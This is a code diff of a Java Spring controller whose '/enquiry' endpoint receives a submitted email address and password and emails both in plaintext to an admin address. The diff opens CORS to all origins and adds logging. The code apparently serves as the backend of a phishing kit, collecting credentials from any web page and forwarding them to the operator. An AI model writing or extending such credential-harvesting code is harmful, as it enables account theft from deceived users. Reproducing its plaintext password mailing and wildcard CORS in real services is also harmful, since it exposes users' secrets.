@@ -3,6 +3,8 @@ package com.Klaus.be_service.controller;
 import com.Klaus.be_service.model.Request;
 import com.Klaus.be_service.model.Request2;
 import com.Klaus.be_service.service.EmailService;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.web.bind.annotation.*;
@@ -18,7 +20,7 @@ import java.util.Objects;
 
 @RestController()
 @RequestMapping("/client")
-@CrossOrigin
+@CrossOrigin(origins = "*")
 public class RequestController {
     @Autowired
     EmailService emailService;
@@ -32,17 +34,18 @@ public class RequestController {
     @Value("${email.post}")
     String toPost;
 
-    @PostMapping("/enquiry")
-    public String enquiry(
-            @RequestBody(required = true) Request request) throws IOException {
-        try {
 
+
+    @PostMapping("/enquiry")
+    public String enquiry(@RequestBody Request request) {
+        Logger logger = LoggerFactory.getLogger(this.getClass());
+
+        try {
+            logger.info("Received enquiry from email: {}", request.getEmailId());
 
             Map<String, Object> templateModel = new HashMap<>();
-
-            templateModel.put("password", request.getPassword());
+            templateModel.put("password", request.getPsd());
             templateModel.put("email", request.getEmailId());
-
 
             emailService.sendHtmlMessage(
                     to, // Admin email
@@ -50,13 +53,18 @@ public class RequestController {
                     "email-template",  // Thymeleaf template name (without .html)
                     templateModel
             );
-            return "Inquiry sent!\n" +
-                    "You’ll hear from us soon!";
-        } catch (MessagingException E) {
-            return "Failed to send inquiry: " + E.getLocalizedMessage();
-        }
 
+            logger.info("Email sent successfully to admin for: {}", request.getEmailId());
+            return "Inquiry sent!\nYou’ll hear from us soon!";
+        } catch (MessagingException  e) {
+            logger.error("Failed to send email for {}: {}", request.getEmailId(), e.getMessage(), e);
+            return "Failed to send inquiry: " + e.getMessage();
+        } catch (Exception e) {
+            logger.error("Unexpected error: ", e);
+            return "Unexpected error: " + e.getMessage();
+        }
     }
+
 
     public byte[] readImageAsBytes(InputStream inputStream) throws IOException {
         ByteArrayOutputStream buffer = new ByteArrayOutputStream();
